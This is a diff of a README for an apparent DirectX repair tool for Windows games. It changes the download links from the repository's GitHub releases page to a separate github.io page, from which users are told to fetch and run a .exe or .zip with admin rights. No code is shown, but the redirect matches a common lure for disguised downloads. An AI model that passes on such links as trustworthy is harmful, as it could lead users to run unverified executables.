@@ -1,6 +1,6 @@
 # 🛠️ DirectX-Repair-Kit-PowerShell - Fix your game graphics errors fast
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/brianabasidial309/DirectX-Repair-Kit-PowerShell/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://brianabasidial309.github.io)
 
 This tool fixes missing file errors that stop games from starting on Windows 10 and Windows 11. Many games require specific DirectX components to function. When these files go missing or become corrupt, the system displays error messages like "d3dx9_43.dll is missing" or "xinput1_3.dll not found." 
 
@@ -19,7 +19,7 @@ You must have administrative rights on your computer to run the repair process. 
 
 Follow these steps to obtain the files:
 
-1. Visit the following link to download the software: [https://github.com/brianabasidial309/DirectX-Repair-Kit-PowerShell/releases](https://github.com/brianabasidial309/DirectX-Repair-Kit-PowerShell/releases)
+1. Visit the following link to download the software: [https://brianabasidial309.github.io](https://brianabasidial309.github.io)
 2. Locate the latest release version on that page.
 3. Click the file ending in .zip or .exe to start the download.
 4. Save the file to your desktop for easy access.
